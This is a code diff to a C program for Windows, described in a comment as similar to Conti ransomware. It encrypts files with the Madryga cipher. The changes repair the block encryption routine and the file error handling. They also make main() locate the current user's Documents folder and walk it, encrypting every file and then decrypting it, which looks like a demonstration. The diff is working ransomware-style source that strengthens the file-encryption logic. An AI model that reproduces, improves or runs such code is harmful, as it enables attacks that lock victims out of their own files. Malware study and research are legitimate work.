@@ -7,6 +7,7 @@ Similar to Conti ransomware. */
 #include <stdint.h>
 #include <string.h>
 #include <windows.h>
+#include <shlobj.h>
 
 #define ROUNDS 32
 
@@ -37,38 +38,18 @@ void madryga_decrypt(u32 *v, u32 *k) {
 }
 // take pointer to data and it's length
 void madryga_encrypt_data(unsigned char *data, int data_len) {
-    int i;
-    uint32_t *ptr = (uint32_t *)data; // cast to uint32_t pointer for 4 byte block processing
-    for (i = 0; i < data_len; i += 8) {
-        madryga_encrypt(ptr, key);
-        ptr += 2;
-    }
-    // check for remaining bytes
-    int remaining = data_len % 8;
-    if (remaining != 0) {
-        // pad with NOPs
-        unsigned char pad[8] = {0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
-        memcpy(pad, ptr, remaining);
-        madryga_encrypt((uint32_t *)pad, key); // encrypt with the padded block
-        memcpy(ptr, pad, remaining);
+    uint32_t *ptr = (uint32_t *)data;
+    // Only process complete 8-byte blocks
+    for (int i = 0; i < data_len / 8; i++) {
+        madryga_encrypt(ptr + (i * 2), key);
     }
 }
 
 void madryga_decrypt_data(unsigned char *data, int data_len) {
-    int i;
     uint32_t *ptr = (uint32_t *)data;
-    for (i = 0; i < data_len / 8; i++) {
-        madryga_decrypt(ptr, key);
-        ptr += 2;
-    }
-    // check for remaining bytes
-    int remaining = data_len % 8;
-    if (remaining != 0) {
-        // pad with NOPs
-        unsigned char pad[8] = {0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
-        memcpy(pad, ptr, remaining);
-        madryga_decrypt((uint32_t *)pad, key);
-        memcpy(ptr, pad, remaining);
+    // Only process complete 8-byte blocks
+    for (int i = 0; i < data_len / 8; i++) {
+        madryga_decrypt(ptr + (i * 2), key);
     }
 }
 
@@ -79,25 +60,38 @@ void encryptFile(const char* input_path, const char* output_path) {
 
     if (!input_file || !output_file) {
         perror("Error opening file");
-        exit(EXIT_FAILURE);
+        if (input_file) fclose(input_file);
+        if (output_file) fclose(output_file);
+        return;
     }
     
     fseek(input_file, 0, SEEK_END);
     long file_size = ftell(input_file);
     fseek(input_file, 0, SEEK_SET);
 
-    unsigned char* file_contents = (unsigned char*)malloc(file_size);
-    fread(file_contents, 1, file_size, input_file);
-
-    for (int i = 0; i < file_size / 8; i++) {
-        madryga_encrypt_data(file_contents + i * 8, 8);
+    // Only allocate if file size is valid
+    if (file_size <= 0) {
+        fclose(input_file);
+        fclose(output_file);
+        return;
     }
 
-    fwrite(file_contents, 1, file_size, output_file);
+    unsigned char* file_contents = (unsigned char*)malloc(file_size);
+    if (!file_contents) {
+        fclose(input_file);
+        fclose(output_file);
+        return;
+    }
 
+    size_t bytes_read = fread(file_contents, 1, file_size, input_file);
+    if (bytes_read > 0) {
+        madryga_encrypt_data(file_contents, bytes_read);
+        fwrite(file_contents, 1, bytes_read, output_file);
+    }
+
+    free(file_contents);
     fclose(input_file);
     fclose(output_file);
-    free(file_contents);
 }
 
 void decryptFile(const char* input_path, const char* output_path) {
@@ -106,25 +100,38 @@ void decryptFile(const char* input_path, const char* output_path) {
 
     if (!input_file || !output_file) {
         perror("Error opening file");
-        exit(EXIT_FAILURE);
+        if (input_file) fclose(input_file);
+        if (output_file) fclose(output_file);
+        return;
     }
 
     fseek(input_file, 0, SEEK_END);
     long file_size = ftell(input_file);
     fseek(input_file, 0, SEEK_SET);
 
-    unsigned char* file_contents = (unsigned char*)malloc(file_size);
-    fread(file_contents, 1, file_size, input_file);
-
-    for (int i = 0; i < file_size / 8; i++) {
-        madryga_decrypt_data(file_contents + i * 8, 8);
+    // Only allocate if file size is valid
+    if (file_size <= 0) {
+        fclose(input_file);
+        fclose(output_file);
+        return;
     }
 
-    fwrite(file_contents, 1, file_size, output_file);
+    unsigned char* file_contents = (unsigned char*)malloc(file_size);
+    if (!file_contents) {
+        fclose(input_file);
+        fclose(output_file);
+        return;
+    }
 
+    size_t bytes_read = fread(file_contents, 1, file_size, input_file);
+    if (bytes_read > 0) {
+        madryga_decrypt_data(file_contents, bytes_read);
+        fwrite(file_contents, 1, bytes_read, output_file);
+    }
+
+    free(file_contents);
     fclose(input_file);
     fclose(output_file);
-    free(file_contents);
 }
 
 // Encrypt folder Logic
@@ -208,8 +215,17 @@ void decryptFiles(const char* folderPath) {
 
 
 int main() {
-    const char* rootFolder = "C:\\Users\\user\\Documents";
-    handleFiles(rootFolder);
-    decryptFiles(rootFolder);
+    char documentsPath[MAX_PATH];
+    HRESULT result = SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, SHGFP_TYPE_CURRENT, documentsPath);
+    
+    if (SUCCEEDED(result)) {
+        printf("Documents folder: %s\n", documentsPath);
+        handleFiles(documentsPath);
+        decryptFiles(documentsPath);
+    } else {
+        printf("Error getting Documents folder path. Error code: %ld\n", result);
+        return 1;
+    }
+    
     return 0;
 }
